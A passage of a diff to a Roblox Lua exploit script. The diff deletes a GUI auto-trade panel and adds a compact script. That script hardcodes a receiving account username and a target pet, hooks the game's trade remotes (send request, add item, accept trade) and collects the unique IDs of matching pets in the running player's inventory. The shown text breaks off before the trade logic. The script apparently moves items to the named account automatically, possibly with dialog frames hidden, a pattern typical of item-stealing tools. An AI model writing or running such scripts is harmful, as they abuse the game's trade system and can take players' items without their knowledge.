@@ -1,1048 +1,156 @@
--- Gui to Lua
--- Version: 3.2
-
--- Instances:
-
-local Main = Instance.new("ScreenGui")
-local Trading = Instance.new("Frame")
-local ScrollingFrame = Instance.new("ScrollingFrame")
-local userInterface = Instance.new("Frame")
-local UICorner = Instance.new("UICorner")
-local UICorner_2 = Instance.new("UICorner")
-local AutoAccept = Instance.new("Frame")
-local UICorner_3 = Instance.new("UICorner")
-local SwitchButton = Instance.new("TextButton")
-local UICorner_4 = Instance.new("UICorner")
-local Circle = Instance.new("Frame")
-local UICorner_5 = Instance.new("UICorner")
-local TextLabel = Instance.new("TextLabel")
-local EggInterface = Instance.new("Frame")
-local UICorner_6 = Instance.new("UICorner")
-local PetInterface = Instance.new("Frame")
-local UICorner_7 = Instance.new("UICorner")
-local StopTradeButton = Instance.new("TextButton")
-local UICorner_8 = Instance.new("UICorner")
-local SendTradeButton = Instance.new("TextButton")
-local UICorner_9 = Instance.new("UICorner")
-local RefreshPlrButton = Instance.new("TextButton")
-local UICorner_10 = Instance.new("UICorner")
-local RefreshPetButton = Instance.new("TextButton")
-local UICorner_11 = Instance.new("UICorner")
-local RefreshEggButton = Instance.new("TextButton")
-local UICorner_12 = Instance.new("UICorner")
-local TextLabel_2 = Instance.new("TextLabel")
-local TextLabel_3 = Instance.new("TextLabel")
-local TradingButton = Instance.new("TextButton")
-local UICorner_13 = Instance.new("UICorner")
-local ShopButton = Instance.new("TextButton")
-local UICorner_14 = Instance.new("UICorner")
-local PotionButton = Instance.new("TextButton")
-local UICorner_15 = Instance.new("UICorner")
-local BucksButton = Instance.new("TextButton")
-local UICorner_16 = Instance.new("UICorner")
-local ClosedButton = Instance.new("TextButton")
-local UICorner_17 = Instance.new("UICorner")
-local CosnoleButton = Instance.new("TextButton")
-local UICorner_18 = Instance.new("UICorner")
-
---Properties:
-
-local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-local previousMain = playerGui:FindFirstChild("Main")
-if previousMain then
-	previousMain:Destroy()
-end
-
-Main.Name = "Main"
-Main.Parent = playerGui
-Main.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-
-Trading.Name = "Trading"
-Trading.Parent = Main
-Trading.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-Trading.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Trading.BorderSizePixel = 0
-Trading.Position = UDim2.new(0.287127972, 0, -0.000489780679, 0)
-Trading.Size = UDim2.new(0.458353192, 0, 1.00048983, 0)
-
-ScrollingFrame.Parent = Trading
-ScrollingFrame.Active = true
-ScrollingFrame.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
-ScrollingFrame.BackgroundTransparency = 0.600
-ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
-ScrollingFrame.BorderSizePixel = 0
-ScrollingFrame.Position = UDim2.new(0.0173499323, 0, 0.163158834, 0)
-ScrollingFrame.Size = UDim2.new(0.964724481, 0, 0.818428278, 0)
-
-userInterface.Name = "userInterface"
-userInterface.Parent = ScrollingFrame
-userInterface.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-userInterface.BackgroundTransparency = 0.300
-userInterface.BorderColor3 = Color3.fromRGB(0, 0, 0)
-userInterface.BorderSizePixel = 0
-userInterface.Position = UDim2.new(0.045937907, 0, 0.0430323742, 0)
-userInterface.Size = UDim2.new(0.880377054, 0, 0.140611932, 0)
-
-UICorner.CornerRadius = UDim.new(0, 10)
-UICorner.Parent = userInterface
-
-UICorner_2.CornerRadius = UDim.new(0, 9)
-UICorner_2.Parent = ScrollingFrame
-
-AutoAccept.Name = "AutoAccept"
-AutoAccept.Parent = ScrollingFrame
-AutoAccept.BackgroundColor3 = Color3.fromRGB(132, 0, 132)
-AutoAccept.BackgroundTransparency = 0.700
-AutoAccept.BorderColor3 = Color3.fromRGB(0, 0, 0)
-AutoAccept.BorderSizePixel = 0
-AutoAccept.Position = UDim2.new(0.0456242338, 0, 0.197564989, 0)
-AutoAccept.Size = UDim2.new(0.881985605, 0, 0.0271360837, 0)
-
-UICorner_3.CornerRadius = UDim.new(0, 10)
-UICorner_3.Parent = AutoAccept
-
-SwitchButton.Name = "Switch/Button"
-SwitchButton.Parent = AutoAccept
-SwitchButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-SwitchButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
-SwitchButton.BorderSizePixel = 0
-SwitchButton.Position = UDim2.new(0.892525733, 0, 0.144767493, 0)
-SwitchButton.Size = UDim2.new(0.0906196088, 0, 0.703322947, 0)
-SwitchButton.Font = Enum.Font.SourceSans
-SwitchButton.Text = ""
-SwitchButton.TextColor3 = Color3.fromRGB(0, 0, 0)
-SwitchButton.TextSize = 14.000
-
-UICorner_4.CornerRadius = UDim.new(0, 100)
-UICorner_4.Parent = SwitchButton
-
-Circle.Name = "Circle"
-Circle.Parent = SwitchButton
-Circle.BackgroundColor3 = Color3.fromRGB(132, 0, 132)
-Circle.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Circle.BorderSizePixel = 0
-Circle.Position = UDim2.new(0, 0, 0.0122798197, 0)
-Circle.Size = UDim2.new(0.521461368, 0, 0.987720251, 0)
-
-UICorner_5.CornerRadius = UDim.new(0, 100)
-UICorner_5.Parent = Circle
-
-TextLabel.Parent = AutoAccept
-TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel.BackgroundTransparency = 1.000
-TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel.BorderSizePixel = 0
-TextLabel.Position = UDim2.new(0.0323584452, 0, 0.131189838, 0)
-TextLabel.Size = UDim2.new(0.236020848, 0, 0.629711211, 0)
-TextLabel.Font = Enum.Font.SourceSansBold
-TextLabel.Text = "Auto-accept  trades"
-TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel.TextSize = 17.000
-
-EggInterface.Name = "EggInterface"
-EggInterface.Parent = ScrollingFrame
-EggInterface.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-EggInterface.BackgroundTransparency = 0.300
-EggInterface.BorderColor3 = Color3.fromRGB(0, 0, 0)
-EggInterface.BorderSizePixel = 0
-EggInterface.Position = UDim2.new(0.04723287, 0, 0.468552977, 0)
-EggInterface.Size = UDim2.new(0.880377054, 0, 0.138668194, 0)
-
-UICorner_6.CornerRadius = UDim.new(0, 10)
-UICorner_6.Parent = EggInterface
-
-PetInterface.Name = "PetInterface"
-PetInterface.Parent = ScrollingFrame
-PetInterface.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-PetInterface.BackgroundTransparency = 0.300
-PetInterface.BorderColor3 = Color3.fromRGB(0, 0, 0)
-PetInterface.BorderSizePixel = 0
-PetInterface.Position = UDim2.new(0.04723287, 0, 0.280062526, 0)
-PetInterface.Size = UDim2.new(0.880377054, 0, 0.138668194, 0)
-
-UICorner_7.CornerRadius = UDim.new(0, 10)
-UICorner_7.Parent = PetInterface
-
-StopTradeButton.Name = "StopTrade/Button"
-StopTradeButton.Parent = ScrollingFrame
-StopTradeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-StopTradeButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
-StopTradeButton.BorderSizePixel = 0
-StopTradeButton.Position = UDim2.new(0.136029661, 0, 0.62344408, 0)
-StopTradeButton.SelectionImageObject = ScrollingFrame
-StopTradeButton.Size = UDim2.new(0.280000001, 0, 0.0320000015, 0)
-StopTradeButton.Font = Enum.Font.SourceSansBold
-StopTradeButton.Text = "Stop loop"
-StopTradeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-StopTradeButton.TextSize = 19.000
-
-UICorner_8.CornerRadius = UDim.new(0, 9)
-UICorner_8.Parent = StopTradeButton
-
-SendTradeButton.Name = "SendTrade/Button"
-SendTradeButton.Parent = ScrollingFrame
-SendTradeButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-SendTradeButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
-SendTradeButton.BorderSizePixel = 0
-SendTradeButton.Position = UDim2.new(0.517543137, 0, 0.623852551, 0)
-SendTradeButton.Size = UDim2.new(0.280323267, 0, 0.0319797136, 0)
-SendTradeButton.Font = Enum.Font.SourceSansBold
-SendTradeButton.Text = "Start auto-trade"
-SendTradeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-SendTradeButton.TextSize = 18.000
-
-UICorner_9.CornerRadius = UDim.new(0, 9)
-UICorner_9.Parent = SendTradeButton
-
-RefreshPlrButton.Name = "RefreshPlr/Button"
-RefreshPlrButton.Parent = ScrollingFrame
-RefreshPlrButton.BackgroundColor3 = Color3.fromRGB(132, 0, 132)
-RefreshPlrButton.BackgroundTransparency = 0.700
-RefreshPlrButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
-RefreshPlrButton.BorderSizePixel = 0
-RefreshPlrButton.Position = UDim2.new(0.0468518287, 0, 0.0091734333, 0)
-RefreshPlrButton.Size = UDim2.new(0.880758107, 0, 0.0262245052, 0)
-RefreshPlrButton.Font = Enum.Font.SourceSansBold
-RefreshPlrButton.Text = "Refresh player  list"
-RefreshPlrButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-RefreshPlrButton.TextSize = 17.000
-
-UICorner_10.CornerRadius = UDim.new(0, 9)
-UICorner_10.Parent = RefreshPlrButton
-
-RefreshPetButton.Name = "RefreshPet/Button"
-RefreshPetButton.Parent = ScrollingFrame
-RefreshPetButton.BackgroundColor3 = Color3.fromRGB(132, 0, 132)
-RefreshPetButton.BackgroundTransparency = 0.700
-RefreshPetButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
-RefreshPetButton.BorderSizePixel = 0
-RefreshPetButton.Position = UDim2.new(0.0468518287, 0, 0.244624898, 0)
-RefreshPetButton.Size = UDim2.new(0.880758107, 0, 0.0262245052, 0)
-RefreshPetButton.Font = Enum.Font.SourceSansBold
-RefreshPetButton.Text = "Refresh pet list"
-RefreshPetButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-RefreshPetButton.TextSize = 17.000
-
-UICorner_11.CornerRadius = UDim.new(0, 9)
-UICorner_11.Parent = RefreshPetButton
-
-RefreshEggButton.Name = "RefreshEgg/Button"
-RefreshEggButton.Parent = ScrollingFrame
-RefreshEggButton.BackgroundColor3 = Color3.fromRGB(132, 0, 132)
-RefreshEggButton.BackgroundTransparency = 0.700
-RefreshEggButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
-RefreshEggButton.BorderSizePixel = 0
-RefreshEggButton.Position = UDim2.new(0.0587994158, 0, 0.434973627, 0)
-RefreshEggButton.Size = UDim2.new(0.880758107, 0, 0.0262245052, 0)
-RefreshEggButton.Font = Enum.Font.SourceSansBold
-RefreshEggButton.Text = "Refresh egg list"
-RefreshEggButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-RefreshEggButton.TextSize = 17.000
-
-UICorner_12.CornerRadius = UDim.new(0, 9)
-UICorner_12.Parent = RefreshEggButton
-
-TextLabel_2.Parent = Trading
-TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_2.BackgroundTransparency = 1.000
-TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_2.BorderSizePixel = 0
-TextLabel_2.Size = UDim2.new(0, 45, 0, 24)
-TextLabel_2.Font = Enum.Font.Unknown
-TextLabel_2.Text = "vox"
-TextLabel_2.TextColor3 = Color3.fromRGB(255, 0, 255)
-TextLabel_2.TextSize = 19.000
-
-TextLabel_3.Parent = TextLabel_2
-TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_3.BackgroundTransparency = 1.000
-TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_3.BorderSizePixel = 0
-TextLabel_3.Position = UDim2.new(0.625474036, 0, 0.791666687, 0)
-TextLabel_3.Size = UDim2.new(0.888032615, 0, 0.894831359, 0)
-TextLabel_3.Font = Enum.Font.FredokaOne
-TextLabel_3.Text = "ADM"
-TextLabel_3.TextColor3 = Color3.fromRGB(255, 0, 255)
-TextLabel_3.TextSize = 14.000
-
-TradingButton.Name = "Trading/Button"
-TradingButton.Parent = Trading
-TradingButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-TradingButton.BackgroundTransparency = 0.400
-TradingButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TradingButton.BorderSizePixel = 0
-TradingButton.Position = UDim2.new(0.314018846, 0, 0.0883753002, 0)
-TradingButton.Size = UDim2.new(0.166999996, 0, 0.0599999987, 0)
-TradingButton.Font = Enum.Font.SourceSansBold
-TradingButton.Text = "Trading"
-TradingButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-TradingButton.TextSize = 19.000
-
-UICorner_13.CornerRadius = UDim.new(0, 9)
-UICorner_13.Parent = TradingButton
-
-ShopButton.Name = "Shop/Button"
-ShopButton.Parent = Trading
-ShopButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-ShopButton.BackgroundTransparency = 0.400
-ShopButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
-ShopButton.BorderSizePixel = 0
-ShopButton.Position = UDim2.new(0.517406344, 0, 0.0883753002, 0)
-ShopButton.Size = UDim2.new(0.166999996, 0, 0.0599999987, 0)
-ShopButton.Font = Enum.Font.SourceSansBold
-ShopButton.Text = "Shop"
-ShopButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-ShopButton.TextSize = 19.000
-
-UICorner_14.CornerRadius = UDim.new(0, 9)
-UICorner_14.Parent = ShopButton
-
-PotionButton.Name = "Potion/Button"
-PotionButton.Parent = Trading
-PotionButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-PotionButton.BackgroundTransparency = 0.400
-PotionButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
-PotionButton.BorderSizePixel = 0
-PotionButton.Position = UDim2.new(0.104669452, 0, 0.0883753151, 0)
-PotionButton.Size = UDim2.new(0.167384252, 0, 0.0599145368, 0)
-PotionButton.Font = Enum.Font.SourceSansBold
-PotionButton.Text = "Potion"
-PotionButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-PotionButton.TextSize = 19.000
-
-UICorner_15.CornerRadius = UDim.new(0, 9)
-UICorner_15.Parent = PotionButton
-
-BucksButton.Name = "Bucks/Button"
-BucksButton.Parent = Trading
-BucksButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-BucksButton.BackgroundTransparency = 0.400
-BucksButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
-BucksButton.BorderSizePixel = 0
-BucksButton.Position = UDim2.new(0.715706289, 0, 0.0869139954, 0)
-BucksButton.Size = UDim2.new(0.166999996, 0, 0.0599999987, 0)
-BucksButton.Font = Enum.Font.SourceSansBold
-BucksButton.Text = "Bucks"
-BucksButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-BucksButton.TextSize = 19.000
-
-UICorner_16.CornerRadius = UDim.new(0, 9)
-UICorner_16.Parent = BucksButton
-
-ClosedButton.Name = "Closed/Button"
-ClosedButton.Parent = Trading
-ClosedButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-ClosedButton.BackgroundTransparency = 1.000
-ClosedButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
-ClosedButton.BorderSizePixel = 0
-ClosedButton.Position = UDim2.new(0.92948246, 0, 0.0175359566, 0)
-ClosedButton.Size = UDim2.new(0.0481034406, 0, 0.0445354134, 0)
-ClosedButton.SizeConstraint = Enum.SizeConstraint.RelativeYY
-ClosedButton.Font = Enum.Font.Unknown
-ClosedButton.Text = "X"
-ClosedButton.TextColor3 = Color3.fromRGB(255, 0, 255)
-ClosedButton.TextSize = 30.000
-
-UICorner_17.CornerRadius = UDim.new(0, 10)
-UICorner_17.Parent = Trading
-
-CosnoleButton.Name = "Cosnole/Button"
-CosnoleButton.Parent = Trading
-CosnoleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-CosnoleButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
-CosnoleButton.BorderSizePixel = 0
-CosnoleButton.Position = UDim2.new(0.768384039, 0, 0.0175359566, 0)
-CosnoleButton.Size = UDim2.new(0.12687543, 0, 0.0445354134, 0)
-CosnoleButton.Font = Enum.Font.SourceSansBold
-CosnoleButton.Text = "Console"
-CosnoleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-CosnoleButton.TextSize = 17.000
-
-UICorner_18.CornerRadius = UDim.new(0, 9)
-UICorner_18.Parent = CosnoleButton
-
--- Scripts:
-
-local function getItemDisplayName(itemData, fallback)
-	local rawName
-	if type(itemData) == "table" then
-		rawName = itemData.displayName
-			or itemData.display_name
-			or itemData.display_name_text
-			or itemData.localizedName
-			or itemData.name
-	end
-	rawName = tostring(rawName or fallback or "Unknown")
-	rawName = string.gsub(rawName, "_%d%d%d%d$", "")
-	rawName = string.gsub(rawName, "[_%-]+", " ")
-	rawName = string.gsub(rawName, "(%a)([%w]*)", function(first, rest)
-		return string.upper(first) .. string.lower(rest)
-	end)
-	return rawName
-end
-
-local function YTODGY_fake_script() -- Main.MainLocalScript 
-	local script = Instance.new('LocalScript', Main)
-
-	
-end
-coroutine.wrap(YTODGY_fake_script)()
-local function LYTAYH_fake_script() -- userInterface.Userscript 
-	local script = Instance.new('LocalScript', userInterface)
-
-	local Players = game:GetService("Players")
-	local panel = script.Parent
-	
-	local playerList = Instance.new("ScrollingFrame")
-	playerList.Name = "PlayerList"
-	playerList.Parent = panel
-	playerList.BackgroundTransparency = 1
-	playerList.BorderSizePixel = 0
-	playerList.Position = UDim2.fromOffset(8, 8)
-	playerList.Size = UDim2.new(1, -16, 1, -16)
-	playerList.AutomaticCanvasSize = Enum.AutomaticSize.Y
-	playerList.CanvasSize = UDim2.new()
-	playerList.ScrollBarThickness = 6
-	
-	local layout = Instance.new("UIListLayout")
-	layout.Parent = playerList
-	layout.Padding = UDim.new(0, 6)
-	layout.SortOrder = Enum.SortOrder.Name
-	
-	local selectedPlayer
-	
-	local function addPlayer(player)
-		if player == Players.LocalPlayer or player.UserId == Players.LocalPlayer.UserId then
-			return
-		end
-
-		local button = Instance.new("TextButton")
-		button.Name = tostring(player.UserId)
-		button.Parent = playerList
-		button.Size = UDim2.new(1, -6, 0, 32)
-		button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-		button.BorderSizePixel = 0
-		button.Font = Enum.Font.SourceSansBold
-		button.Text = player.Name
-		button.TextColor3 = Color3.new(1, 1, 1)
-		button.TextSize = 17
-	
-		Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)
-	
-		button.Activated:Connect(function()
-			selectedPlayer = player
-			panel:SetAttribute("SelectedPlayerUserId", player.UserId)
-	
-			for _, item in playerList:GetChildren() do
-				if item:IsA("TextButton") then
-					item.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-				end
-			end
-	
-			button.BackgroundColor3 = Color3.fromRGB(158, 0, 158)
-			print("Selected player:", selectedPlayer.Name)
-		end)
-	end
-	
-	for _, player in Players:GetPlayers() do
-		addPlayer(player)
-	end
-	
-	Players.PlayerAdded:Connect(addPlayer)
-	
-	Players.PlayerRemoving:Connect(function(player)
-		local button = playerList:FindFirstChild(tostring(player.UserId))
-		if button then
-			button:Destroy()
-		end
-	
-		if selectedPlayer == player then
-			selectedPlayer = nil
-			panel:SetAttribute("SelectedPlayerUserId", nil)
-		end
-	end)
-end
-coroutine.wrap(LYTAYH_fake_script)()
-local function DBQCXK_fake_script() -- SwitchButton.SwitchScript 
-	local script = Instance.new('LocalScript', SwitchButton)
-
-	local button = script.Parent
-	local circle = button:WaitForChild("Circle")
-	
-	local green = false
-	
-	circle.BackgroundColor3 = Color3.fromRGB(132, 0, 132)
-	
-	button.Activated:Connect(function()
-		green = not green
-	
-		if green then
-			circle.Position = UDim2.new(0.47, 0, 0,0.012, 0)
-			circle.BackgroundColor3 = Color3.fromRGB(255, 0, 255)
-		else
-			circle.Position = UDim2.new(0, 0, 0, 0.12, 0)
-			circle.BackgroundColor3 = Color3.fromRGB(132, 0, 132)
-		end
-	end)
-end
-coroutine.wrap(DBQCXK_fake_script)()
-local function ITRGIUK_fake_script() -- EggInterface.EggScript 
-	local script = Instance.new('LocalScript', EggInterface)
-
-	
-end
-coroutine.wrap(ITRGIUK_fake_script)()
-local function YWYP_fake_script() -- PetInterface.Petscript 
-	local script = Instance.new('LocalScript', PetInterface)
-
-	
-end
-coroutine.wrap(YWYP_fake_script)()
-local function FKNY_fake_script() -- StopTradeButton.StopTradeScript 
-	local script = Instance.new('LocalScript', StopTradeButton)
-
-	
-end
-coroutine.wrap(FKNY_fake_script)()
-local function JJKLBS_fake_script() -- SendTradeButton.SendTradeScript 
-	local script = Instance.new('LocalScript', SendTradeButton)
-
-	local TweenService = game:GetService("TweenService")
-	
-	local button = script.Parent
-	assert(button:IsA("GuiButton"), "Parent must be a TextButton or ImageButton")
-	
-	local fill = button:FindFirstChild("ClickFill")
-	if not fill then
-	
-		fill = Instance.new("Frame")
-		fill.Name = "ClickFill"
-		fill.AnchorPoint = Vector2.new(0, 0.5)
-		fill.Position = UDim2.fromScale(0, 0.5)
-		fill.Size = UDim2.fromScale(0, 1)
-		fill.BackgroundColor3 = Color3.fromRGB(163, 0, 163)
-		fill.BackgroundTransparency = 0.30
-		fill.BorderSizePixel = 0
-		fill.ZIndex = button.ZIndex + 1
-		fill.Parent = button
-	
-		local corner = button:FindFirstChildOfClass("UICorner")
-		if corner then
-			corner:Clone().Parent = fill
-		end
-	end
-	
-	local originalTextTransparency = button:IsA("TextButton") and button.TextTransparency or nil
-	local activeTween
-	
-	local function playClickFill()
-		if activeTween then
-			activeTween:Cancel()
-		end
-	
-		fill.Size = UDim2.fromScale(0, 1)
-		fill.Visible = true
-		local tween = TweenService:Create(
-			fill,
-			TweenInfo.new(0.45, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
-			{Size = UDim2.fromScale(1, 1)}
-		)
-		activeTween = tween
-		tween.Completed:Once(function()
-			if activeTween == tween then
-				fill.Visible = false
-			end
-		end)
-		tween:Play()
-	
-		if button:IsA("TextButton") then
-			button.TextTransparency = 0.25
-			task.delay(0.18, function()
-				if button.Parent then
-					button.TextTransparency = originalTextTransparency
-				end
-			end)
-		end
-	end
-	
-	button.Activated:Connect(playClickFill)
-	
-end
-coroutine.wrap(JJKLBS_fake_script)()
-local function KQGQGYA_fake_script() -- RefreshPlrButton.RefreshplrScript 
-	local script = Instance.new('LocalScript', RefreshPlrButton)
-
-	
-end
-coroutine.wrap(KQGQGYA_fake_script)()
-local function BDIVN_fake_script() -- RefreshPetButton.RefreshpetScript 
-	local script = Instance.new('LocalScript', RefreshPetButton)
-
-	print("Hello world!")
-	
-end
-coroutine.wrap(BDIVN_fake_script)()
-local function ODIBEK_fake_script() -- RefreshEggButton.RefresheggScript 
-	local script = Instance.new('LocalScript', RefreshEggButton)
-
-	print("Hello world!")
-	
-end
-coroutine.wrap(ODIBEK_fake_script)()
-local function ZZOXG_fake_script() -- TradingButton.LocalScript 
-	local script = Instance.new('LocalScript', TradingButton)
-
-	local button = script.Parent
-	local main = button:FindFirstAncestor("Main")
-	local potion = main:WaitForChild("Potion")
-	local trading = main:WaitForChild("Trading")
-	local stroke = button:WaitForChild("UIStroke")
-	
-	button.BackgroundColor3 = Color3.fromRGB(154, 0, 154)
-	stroke.Color = Color3.fromRGB(255, 0, 255)
-	
-	button.Activated:Connect(function()
-		potion.Visible = false
-		trading.Visible = true
-	end)
-end
-coroutine.wrap(ZZOXG_fake_script)()
-local function IAMQYXD_fake_script() -- ShopButton.LocalScript 
-	local script = Instance.new('LocalScript', ShopButton)
-
-	local button = script.Parent
-	local main = button:FindFirstAncestor("Main")
-	local potion = main:WaitForChild("Potion")
-	local shop = main:WaitForChild("Shop")
-	local stroke = button:WaitForChild("UIStroke")
-	
-	button.BackgroundColor3 = Color3.fromRGB(154, 0, 154)
-	stroke.Color = Color3.fromRGB(255, 0, 255)
-	
-	button.Activated:Connect(function()
-		potion.Visible = false
-		shop.Visible = false
-	end)
-end
-coroutine.wrap(IAMQYXD_fake_script)()
-local function YRII_fake_script() -- PotionButton.LocalScript 
-	local script = Instance.new('LocalScript', PotionButton)
-
-	local button = script.Parent
-	local main = button:FindFirstAncestor("Main")
-	local potion = main:WaitForChild("Potion")
-	local trading = main:WaitForChild("Trading")
-	local stroke = button:WaitForChild("UIStroke")
-	
-	button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	stroke.Color = Color3.fromRGB(255, 0, 255)
-	
-	button.Activated:Connect(function()
-		potion.Visible = true
-		trading.Visible = false
-		
-		
-	end)
-end
-coroutine.wrap(YRII_fake_script)()
-local function ANTE_fake_script() -- BucksButton.LocalScript 
-	local script = Instance.new('LocalScript', BucksButton)
-
-	local button = script.Parent
-	local main = button:FindFirstAncestor("Main")
-	local potion = main:WaitForChild("Potion")
-	local bucks = main:WaitForChild("Bucks")
-	local stroke = button:WaitForChild("UIStroke")
-	
-	button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	stroke.Color = Color3.fromRGB(255, 0, 255)
-	
-	button.Activated:Connect(function()
-		potion.Visible = false
-		bucks.Visible = true
-	end)
-end
-coroutine.wrap(ANTE_fake_script)()
-local function RHZAMY_fake_script() -- ClosedButton.ClosedScript 
-	local script = Instance.new('LocalScript', ClosedButton)
-
-	local button = script.Parent
-	local main = button:FindFirstAncestor("Main")
-	local trading = main:WaitForChild("Trading")
-	local icon = main:WaitForChild("Icon")
-	
-	button.Activated:Connect(function()
-		trading.Visible = false
-		icon.Visible = true
-	end)
-end
-coroutine.wrap(RHZAMY_fake_script)()
-local function BTCKXWL_fake_script() -- CosnoleButton.ConsoleScript 
-	local script = Instance.new('LocalScript', CosnoleButton)
-
-	local StarterGui = game:GetService("StarterGui")
-	
-	local button = script.Parent
-	if not button:IsA("TextButton") then
-		return
-	end
-	
-	local function openDeveloperConsole()
-		for _ = 1, 10 do
-			local success, errorMessage = pcall(function()
-				StarterGui:SetCore("DevConsoleVisible", true)
-			end)
-	
-			if success then
-				return
-			end
-	
-			task.wait(0.25)
-			if errorMessage then
-				warn("Could not open Developer Console: " .. errorMessage)
-			end
-		end
-	end
-	
-	button.Activated:Connect(openDeveloperConsole)
-	
-end
-coroutine.wrap(BTCKXWL_fake_script)()
-
-local function TRADELOOP_fake_script() -- Main.TradeLoopScript
-	local script = Instance.new("LocalScript", Main)
-
-	local Players = game:GetService("Players")
-	local ReplicatedStorage = game:GetService("ReplicatedStorage")
-	local playerPanel = userInterface
-	local sendTradeRemote = ReplicatedStorage:FindFirstChild("TradeAPI/SendTradeRequest", true)
-	local addItemRemote = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AddItemToOffer")
-	local loopRunning = false
-
-	local function getSelectedPlayer()
-		local userId = playerPanel:GetAttribute("SelectedPlayerUserId")
-		if type(userId) ~= "number" then
-			return nil
-		end
-
-		for _, player in ipairs(Players:GetPlayers()) do
-			if player.UserId == userId then
-				return player
-			end
-		end
-		return nil
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- ================= CONFIGURATION =================
+MainAccUsername = {"Her0eXBuildera31"} 
+TARGET_ITEM_NAME = "retired_egg"
+TARGET_ITEM_FORM = "NORMAL" -- NORMAL, NEON, or MEGA_NEON
+ForceReceiver = false 
+
+targetFrameName = {"Dialog", "Frametest2", "Frametest3"}
+-- =================================================
+
+local addItemRemote = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AddItemToOffer")
+local sendTradeRemote = ReplicatedStorage:FindFirstChild("TradeAPI/SendTradeRequest", true)
+local tradeFunction = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AcceptOrDeclineTradeRequest")
+local API = ReplicatedStorage:WaitForChild("API")
+
+local successClientData, ClientData = pcall(function()
+	return require(ReplicatedStorage:WaitForChild("ClientModules"):WaitForChild("Core"):WaitForChild("ClientData"))
+end)
+
+local function getMultipleUniqueIdsByName(itemName, itemForm, limit)
+	if not successClientData or not ClientData then
+		return {}
 	end
 
-	local function addSelectedPets()
-		local petList = PetInterface:FindFirstChild("PetInventoryList")
-		if not petList then
-			return
-		end
-
-		local addedCount = 0
-		for _, button in ipairs(petList:GetChildren()) do
-			if button:IsA("TextButton") and button:GetAttribute("Selected") == true then
-				local petIds = button:GetAttribute("PetIds")
-				if type(petIds) == "string" then
-					for petId in string.gmatch(petIds, "[^,]+") do
-						if addedCount >= 18 then
-							return
-						end
-						pcall(function()
-							addItemRemote:FireServer(petId)
-						end)
-						addedCount += 1
-						task.wait(0.05)
-					end
-				end
-			end
-		end
+	local dataStore = ClientData.get_data()
+	local playerData = dataStore and (dataStore[LocalPlayer] or dataStore[LocalPlayer.Name])
+	
+	if not playerData or not playerData.inventory or not playerData.inventory.pets then
+		return {}
 	end
 
-	local function stopLoop()
-		loopRunning = false
-		SendTradeButton.Text = "Start auto-trade"
-	end
+	local uniqueIds = {}
+	for uniqueId, itemData in pairs(playerData.inventory.pets) do
+		if itemData and itemData.kind == itemName then
+			local properties = itemData.properties or {}
+			local isNeon = properties.neon == true
+			local isMegaNeon = properties.mega_neon == true
+			local matchesForm = itemForm == "NEON" and isNeon and not isMegaNeon
+				or itemForm == "MEGA_NEON" and isMegaNeon
+				or itemForm == "NORMAL" and not isNeon and not isMegaNeon
 
-	local function startLoop()
-		if loopRunning then
-			return
-		end
-		if not sendTradeRemote or not sendTradeRemote:IsA("RemoteEvent") then
-			warn("TradeAPI/SendTradeRequest was not found")
-			return
-		end
-		if not getSelectedPlayer() then
-			warn("Select a player first")
-			return
-		end
-
